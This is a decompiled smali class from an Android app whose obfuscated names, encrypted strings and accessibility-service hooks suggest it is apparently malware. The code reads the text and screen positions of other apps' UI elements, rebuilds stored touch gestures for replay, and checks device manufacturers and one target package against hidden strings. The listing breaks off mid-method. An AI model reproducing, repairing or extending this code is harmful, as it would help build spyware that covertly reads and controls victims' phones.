.class public abstract Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;
.super Ljava/lang/Object;
.source "SourceFile"


# static fields
.field public static a:Ljava/util/LinkedList;

.field public static b:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

.field static c:Ljava/util/LinkedList;

.field private static d:Landroid/view/accessibility/AccessibilityNodeInfo;

.field public static final e:Ljava/util/ArrayList;

.field private static f:Ljava/lang/String;

.field static g:Landroid/os/Handler;


# direct methods
.method static constructor <clinit>()V
    .locals 2

    new-instance v0, Ljava/util/LinkedList;

    invoke-direct {v0}, Ljava/util/LinkedList;-><init>()V

    sput-object v0, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->c:Ljava/util/LinkedList;

    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    sput-object v0, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->e:Ljava/util/ArrayList;

    sget-object v0, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->f:Ljava/lang/String;

    new-instance v0, Landroid/os/Handler;

    new-instance v1, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU$e;

    invoke-direct {v1}, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU$e;-><init>()V

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Handler$Callback;)V

    sput-object v0, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->g:Landroid/os/Handler;

    return-void
.end method

.method static synthetic a()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->n()V

    return-void
.end method

.method static synthetic b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;)Ljava/util/LinkedList;
    .locals 0

    .line 1
    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->g(Lcom/vknnolqo/p9sv5zvf/SM099EXd;)Ljava/util/LinkedList;

    move-result-object p0

    return-object p0
.end method

.method static synthetic c(Lcom/vknnolqo/p9sv5zvf/SM099EXd;)Ljava/util/LinkedList;
    .locals 0

    .line 1
    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->h(Lcom/vknnolqo/p9sv5zvf/SM099EXd;)Ljava/util/LinkedList;

    move-result-object p0

    return-object p0
.end method

.method private static d(Landroid/view/accessibility/AccessibilityNodeInfo;ZZI)V
    .locals 1

    .line 1
    if-nez p0, :cond_0

    return-void

    :cond_0
    new-instance v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/m7;

    invoke-direct {v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/m7;-><init>()V

    invoke-virtual {v0, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/m7;->n(Z)V

    invoke-virtual {v0, p2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/m7;->o(Z)V

    invoke-virtual {v0, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/m7;->q(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    invoke-virtual {v0, p3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/m7;->p(I)V

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object p1

    if-eqz p1, :cond_1

    :goto_0
    invoke-interface {p1}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v0, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/m7;->r(Ljava/lang/String;)V

    goto :goto_1

    :cond_1
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object p1

    if-eqz p1, :cond_2

    goto :goto_0

    :cond_2
    :goto_1
    new-instance p1, Landroid/graphics/Rect;

    invoke-direct {p1}, Landroid/graphics/Rect;-><init>()V

    invoke-virtual {p0, p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    invoke-virtual {p1}, Landroid/graphics/Rect;->centerX()I

    move-result p0

    invoke-virtual {v0, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/m7;->u(I)V

    invoke-virtual {p1}, Landroid/graphics/Rect;->centerY()I

    move-result p0

    invoke-virtual {v0, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/m7;->v(I)V

    iget p0, p1, Landroid/graphics/Rect;->left:I

    invoke-virtual {v0, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/m7;->s(I)V

    iget p0, p1, Landroid/graphics/Rect;->right:I

    invoke-virtual {v0, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/m7;->l(I)V

    iget p0, p1, Landroid/graphics/Rect;->top:I

    invoke-virtual {v0, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/m7;->t(I)V

    iget p0, p1, Landroid/graphics/Rect;->bottom:I

    invoke-virtual {v0, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/m7;->m(I)V

    sget-object p0, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->e:Ljava/util/ArrayList;

    invoke-virtual {p0, v0}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    return-void
.end method

.method public static e(Landroid/view/accessibility/AccessibilityEvent;Lcom/vknnolqo/p9sv5zvf/SM099EXd;)V
    .locals 1

    .line 1
    sget-boolean v0, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->T:Z

    if-eqz v0, :cond_0

    return-void

    :cond_0
    sget-boolean v0, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->V:Z

    if-nez v0, :cond_1

    sget-boolean v0, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->U:Z

    if-nez v0, :cond_1

    invoke-static {p0, p1}, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->p(Landroid/view/accessibility/AccessibilityEvent;Lcom/vknnolqo/p9sv5zvf/SM099EXd;)V

    :cond_1
    sget-boolean v0, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->V:Z

    if-eqz v0, :cond_2

    sget-boolean v0, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->U:Z

    if-nez v0, :cond_2

    invoke-static {p0, p1}, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->m(Landroid/view/accessibility/AccessibilityEvent;Lcom/vknnolqo/p9sv5zvf/SM099EXd;)V

    goto :goto_0

    :cond_2
    sget-boolean v0, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->U:Z

    if-eqz v0, :cond_3

    invoke-static {p0, p1}, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->l(Landroid/view/accessibility/AccessibilityEvent;Lcom/vknnolqo/p9sv5zvf/SM099EXd;)V

    :cond_3
    :goto_0
    return-void
.end method

.method public static f()V
    .locals 1

    .line 1
    sget-boolean v0, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->V:Z

    if-eqz v0, :cond_0

    const/4 v0, 0x0

    sput-boolean v0, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->V:Z

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/z40;->k()V

    :cond_0
    return-void
.end method

.method private static g(Lcom/vknnolqo/p9sv5zvf/SM099EXd;)Ljava/util/LinkedList;
    .locals 9

    .line 1
    sget-object p0, Lcom/vknnolqo/p9sv5zvf/GBPjHfKu;->n:Landroid/content/Context;

    const/4 v0, 0x3

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v2, v1, [B

    fill-array-data v2, :array_1

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    const-string v2, ""

    invoke-static {p0, v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p0

    if-eqz p0, :cond_3

    invoke-virtual {v2, p0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    goto :goto_2

    :cond_0
    const/16 v0, 0xb

    new-array v0, v0, [B

    fill-array-data v0, :array_2

    new-array v2, v1, [B

    fill-array-data v2, :array_3

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object p0

    new-instance v0, Ljava/util/LinkedList;

    invoke-direct {v0}, Ljava/util/LinkedList;-><init>()V

    const/4 v2, 0x0

    move v3, v2

    :goto_0
    array-length v4, p0

    if-ge v3, v4, :cond_2

    aget-object v4, p0, v3

    const/16 v5, 0x9

    new-array v5, v5, [B

    fill-array-data v5, :array_4

    new-array v6, v1, [B

    fill-array-data v6, :array_5

    invoke-static {v5, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v4

    new-instance v5, Ljava/util/LinkedList;

    invoke-direct {v5}, Ljava/util/LinkedList;-><init>()V

    move v6, v2

    :goto_1
    array-length v7, v4

    if-ge v6, v7, :cond_1

    :try_start_0
    new-instance v7, Lorg/json/JSONObject;

    aget-object v8, v4, v6

    invoke-direct {v7, v8}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    invoke-static {v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/eq;->c(Lorg/json/JSONObject;)Landroid/view/MotionEvent;

    move-result-object v7

    invoke-virtual {v5, v7}, Ljava/util/LinkedList;->offer(Ljava/lang/Object;)Z
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    add-int/lit8 v6, v6, 0x1

    goto :goto_1

    :catch_0
    move-exception p0

    new-instance v0, Ljava/lang/RuntimeException;

    invoke-direct {v0, p0}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v0

    :cond_1
    invoke-virtual {v0, v5}, Ljava/util/LinkedList;->add(Ljava/lang/Object;)Z

    add-int/lit8 v3, v3, 0x1

    goto :goto_0

    :cond_2
    return-object v0

    :cond_3
    :goto_2
    new-instance p0, Ljava/util/LinkedList;

    invoke-direct {p0}, Ljava/util/LinkedList;-><init>()V

    return-object p0

    :array_0
    .array-data 1
        0x19t
        0x63t
        -0x43t
    .end array-data

    :array_1
    .array-data 1
        0x63t
        0x1bt
        -0x35t
        -0x56t
        0x71t
        -0x65t
        0x77t
        0x12t
    .end array-data

    :array_2
    .array-data 1
        0xdt
        -0x3bt
        0x26t
        0x35t
        0x5t
        0x5at
        -0x51t
        0x6t
        0x5dt
        -0x6et
        0x78t
    .end array-data

    :array_3
    .array-data 1
        0x35t
        -0xat
        0x12t
        0x5dt
        0x70t
        0x3ct
        -0x2at
        0x32t
    .end array-data

    :array_4
    .array-data 1
        0x23t
        -0x7et
        0xdt
        -0x12t
        0x5dt
        -0x1dt
        -0x12t
        -0x42t
        0x73t
    .end array-data

    nop

    :array_5
    .array-data 1
        0x14t
        -0x4at
        0x38t
        -0x7ct
        0x3bt
        -0x2ct
        -0x64t
        -0x2bt
    .end array-data
.end method

.method private static h(Lcom/vknnolqo/p9sv5zvf/SM099EXd;)Ljava/util/LinkedList;
    .locals 4

    .line 1
    sget-object p0, Lcom/vknnolqo/p9sv5zvf/GBPjHfKu;->n:Landroid/content/Context;

    const/4 v0, 0x6

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v2, v1, [B

    fill-array-data v2, :array_1

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    const-string v2, ""

    invoke-static {p0, v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p0

    if-eqz p0, :cond_2

    invoke-virtual {v2, p0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    goto :goto_1

    :cond_0
    const/16 v0, 0xb

    new-array v0, v0, [B

    fill-array-data v0, :array_2

    new-array v1, v1, [B

    fill-array-data v1, :array_3

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object p0

    new-instance v0, Ljava/util/LinkedList;

    invoke-direct {v0}, Ljava/util/LinkedList;-><init>()V

    const/4 v1, 0x0

    :goto_0
    array-length v2, p0

    if-ge v1, v2, :cond_1

    :try_start_0
    new-instance v2, Lorg/json/JSONObject;

    aget-object v3, p0, v1

    invoke-direct {v2, v3}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    invoke-static {v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/eq;->b(Lorg/json/JSONObject;)Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/m7;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/util/LinkedList;->offer(Ljava/lang/Object;)Z
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    :catch_0
    move-exception p0

    new-instance v0, Ljava/lang/RuntimeException;

    invoke-direct {v0, p0}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v0

    :cond_1
    return-object v0

    :cond_2
    :goto_1
    new-instance p0, Ljava/util/LinkedList;

    invoke-direct {p0}, Ljava/util/LinkedList;-><init>()V

    return-object p0

    :array_0
    .array-data 1
        -0x4at
        0x24t
        0x75t
        0x58t
        0x3at
        0x58t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x3ct
        0x50t
        0xct
        0xbt
        0x4et
        0x2at
        0x7at
        0x6bt
    .end array-data

    :array_2
    .array-data 1
        0x47t
        -0x2ft
        0x75t
        -0x68t
        -0x3bt
        -0x73t
        0x14t
        -0x1at
        0x17t
        -0x7at
        0x2bt
    .end array-data

    :array_3
    .array-data 1
        0x7ft
        -0x1et
        0x41t
        -0x10t
        -0x50t
        -0x15t
        0x6dt
        -0x2et
    .end array-data
.end method

.method public static i(Lcom/vknnolqo/p9sv5zvf/SM099EXd;)V
    .locals 1

    .line 1
    sput-object p0, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->b:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    new-instance p0, Ljava/lang/Thread;

    new-instance v0, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU$f;

    invoke-direct {v0}, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU$f;-><init>()V

    invoke-direct {p0, v0}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {p0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method public static j(Lcom/vknnolqo/p9sv5zvf/SM099EXd;)V
    .locals 1

    .line 1
    sput-object p0, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->b:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    new-instance p0, Ljava/lang/Thread;

    new-instance v0, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU$g;

    invoke-direct {v0}, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU$g;-><init>()V

    invoke-direct {p0, v0}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {p0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method private static k()Z
    .locals 5

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->f:Ljava/lang/String;

    const/4 v1, 0x4

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v3, v2, [B

    fill-array-data v3, :array_1

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_2

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->f:Ljava/lang/String;

    const/4 v1, 0x6

    new-array v1, v1, [B

    fill-array-data v1, :array_2

    new-array v3, v2, [B

    fill-array-data v3, :array_3

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_2

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->f:Ljava/lang/String;

    const/4 v1, 0x7

    new-array v3, v1, [B

    fill-array-data v3, :array_4

    new-array v4, v2, [B

    fill-array-data v4, :array_5

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_0

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v3, 0x1f

    if-ge v0, v3, :cond_2

    :cond_0
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->f:Ljava/lang/String;

    new-array v1, v1, [B

    fill-array-data v1, :array_6

    new-array v2, v2, [B

    fill-array-data v2, :array_7

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_1

    goto :goto_0

    :cond_1
    const/4 v0, 0x0

    goto :goto_1

    :cond_2
    :goto_0
    const/4 v0, 0x1

    :goto_1
    return v0

    :array_0
    .array-data 1
        0x5ft
        -0x10t
        -0x4bt
        -0x61t
    .end array-data

    :array_1
    .array-data 1
        0x30t
        -0x80t
        -0x3bt
        -0x10t
        -0x42t
        -0x78t
        -0x24t
        0x7t
    .end array-data

    :array_2
    .array-data 1
        0x15t
        -0x31t
        -0x26t
        0xdt
        -0x6ft
        -0x45t
    .end array-data

    nop

    :array_3
    .array-data 1
        0x67t
        -0x56t
        -0x45t
        0x61t
        -0x4t
        -0x22t
        0x39t
        -0x4dt
    .end array-data

    :array_4
    .array-data 1
        -0x20t
        0xbt
        -0x43t
        -0x17t
        0x61t
        0x1ct
        0x41t
    .end array-data

    :array_5
    .array-data 1
        -0x71t
        0x65t
        -0x28t
        -0x67t
        0xdt
        0x69t
        0x32t
        -0x8t
    .end array-data

    :array_6
    .array-data 1
        -0x39t
        -0x12t
        -0x3at
        -0x4dt
        -0x6ct
        -0x4dt
        0x29t
    .end array-data

    :array_7
    .array-data 1
        -0x78t
        -0x80t
        -0x5dt
        -0x1dt
        -0x8t
        -0x3at
        0x5at
        -0x74t
    .end array-data
.end method

.method private static l(Landroid/view/accessibility/AccessibilityEvent;Lcom/vknnolqo/p9sv5zvf/SM099EXd;)V
    .locals 5

    .line 1
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result p1

    const/16 v0, 0x4000

    if-ne p1, v0, :cond_1

    const/16 p1, 0x14

    new-array p1, p1, [B

    fill-array-data p1, :array_0

    const/16 v0, 0x8

    new-array v1, v0, [B

    fill-array-data v1, :array_1

    invoke-static {p1, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v1

    invoke-virtual {p1, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_1

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object p1

    if-eqz p1, :cond_1

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object p1

    invoke-interface {p1}, Ljava/util/List;->isEmpty()Z

    move-result p1

    if-nez p1, :cond_1

    const/16 p1, 0x12

    new-array v1, p1, [B

    fill-array-data v1, :array_2

    new-array v2, v0, [B

    fill-array-data v2, :array_3

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v2

    const/4 v3, 0x0

    invoke-interface {v2, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_0

    new-array v1, p1, [B

    fill-array-data v1, :array_4

    new-array v2, v0, [B

    fill-array-data v2, :array_5

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v2

    invoke-interface {v2, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_0

    new-array p1, p1, [B

    fill-array-data p1, :array_6

    new-array v1, v0, [B

    fill-array-data v1, :array_7

    invoke-static {p1, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v1

    invoke-interface {v1, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v1

    invoke-virtual {p1, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-nez p1, :cond_0

    const/16 p1, 0x15

    new-array v1, p1, [B

    fill-array-data v1, :array_8

    new-array v2, v0, [B

    fill-array-data v2, :array_9

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v2

    invoke-interface {v2, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_0

    new-array v1, p1, [B

    fill-array-data v1, :array_a

    new-array v2, v0, [B

    fill-array-data v2, :array_b

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v2

    invoke-interface {v2, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_0

    const/16 v1, 0x21

    new-array v1, v1, [B

    fill-array-data v1, :array_c

    new-array v2, v0, [B

    fill-array-data v2, :array_d

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v2

    invoke-interface {v2, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_0

    const/16 v1, 0x2a

    new-array v1, v1, [B

    fill-array-data v1, :array_e

    new-array v2, v0, [B

    fill-array-data v2, :array_f

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v2

    invoke-interface {v2, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_0

    const/16 v1, 0x11

